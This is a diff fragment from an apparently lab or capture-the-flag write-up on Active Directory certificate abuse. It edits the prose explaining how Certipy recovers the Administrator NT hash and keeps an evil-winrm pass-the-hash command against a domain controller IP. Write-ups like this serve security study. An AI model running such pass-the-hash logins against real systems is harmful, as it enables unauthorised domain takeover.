@@ -987,7 +987,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 *Certipy PKINIT: TGT and NT hash recovered for Administrator*
 
-Certipy gets that hash by requesting a Kerberos ticket to itself and reading the credential blob out of the ticket's PAC. NTLM authenticates with the hash itself, so there is nothing left to crack. We pass it over WinRM.
+Certipy gets that hash by requesting a Kerberos ticket to itself and reading the credential blob out of the ticket's PAC. We log in to SG-DC01 over WinRM with `Administrator`'s NT hash.
 
 ```
 evil-winrm -i '10.1.24.100' -u 'Administrator' -H 'a07b7bbc98b574afe52bbeb5d07d9c0a'
